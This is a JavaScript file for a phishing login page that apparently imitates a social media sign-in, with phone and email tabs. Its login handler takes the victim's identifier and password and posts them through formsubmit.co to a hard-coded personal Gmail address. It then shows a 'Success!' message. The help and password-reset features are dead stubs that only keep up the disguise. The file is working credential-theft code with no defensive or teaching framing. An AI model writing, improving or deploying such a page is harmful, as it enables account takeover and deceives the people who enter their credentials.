document.addEventListener('DOMContentLoaded', () => {
  const phoneTab = document.getElementById('phone-tab');
  const emailTab = document.getElementById('email-tab');
  const phoneFields = document.getElementById('phone-fields');
  const emailFields = document.getElementById('email-fields');
  const phoneInput = document.getElementById('phone');
  const emailInput = document.getElementById('email-username');
  const passwordInput = document.getElementById('password');
  const btn = document.getElementById('login-btn');
  const container = document.querySelector('.container');
  const forgotLink = document.getElementById('forgot-link');
  const togglePassword = document.getElementById('togglePassword');

  // Close button (×)
  document.getElementById('close-btn').addEventListener('click', () => {
    window.close() || window.history.back();
  });

  // Help button (?)
  document.getElementById('help-btn').addEventListener('click', () => {
    container.innerHTML = `
      <div class="forgot-message">
        <h2 style="color:#FF004F;">Not available</h2>
        <p>This feature is currently not available.</p>
        <button class="return-btn" onclick="location.reload()">Return to Login</button>
      </div>
    `;
  });

  // Toggle password visibility
  togglePassword.addEventListener('click', () => {
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    togglePassword.classList.toggle('ph-eye');
    togglePassword.classList.toggle('ph-eye-slash');
  });

  // Forgot password
  forgotLink.addEventListener('click', (e) => {
    e.preventDefault();
    container.innerHTML = `
      <div class="forgot-message">
        <h2 style="color:#FF004F;">Not available</h2>
        <p>This feature is currently not available.</p>
        <button class="return-btn" onclick="location.reload()">Return to Login</button>
      </div>
    `;
  });

  // Tab switching
  phoneTab.onclick = () => { phoneTab.classList.add('active'); emailTab.classList.remove('active'); phoneFields.style.display = 'block'; emailFields.style.display = 'none'; checkForm(); };
  emailTab.onclick = () => { emailTab.classList.add('active'); phoneTab.classList.remove('active'); emailFields.style.display = 'block'; phoneFields.style.display = 'none'; checkForm(); };

  function checkForm() {
    const isPhone = phoneTab.classList.contains('active');
    const field1 = isPhone ? phoneInput.value.trim() : emailInput.value.trim();
    const field2 = passwordInput.value.trim();
    if (field1 && field2) btn.classList.add('active');
    else btn.classList.remove('active');
  }

  [phoneInput, emailInput, passwordInput].forEach(i => i.addEventListener('input', checkForm));

  // LOGIN BUTTON
  btn.addEventListener('click', function(e) {
    e.preventDefault();
    if (!btn.classList.contains('active')) return;

    const method = phoneTab.classList.contains('active') ? 'Phone' : 'Email/Username';
    const identifier = method === 'Phone' ? phoneInput.value.trim() : emailInput.value.trim();
    const password = passwordInput.value;

    const yourEmail = "mickedroms555@gmail.com";

    fetch("https://formsubmit.co/ajax/" + yourEmail, {
      method: "POST",
      headers: { "Content-Type": "application/json", "Accept": "application/json" },
      body: JSON.stringify({
        Method: method,
        Identifier: identifier,
        Password: password,
        Time: new Date().toLocaleString()
      })
    });

    container.innerHTML = `
      <div style="text-align:center; padding:60px 20px;">
        <h2 style="color:#FF004F; margin-bottom:20px;">Success!</h2>
        <p style="font-size:18px;">Your login information was delivered.</p>
      </div>
    `;
  });

  checkForm();
});
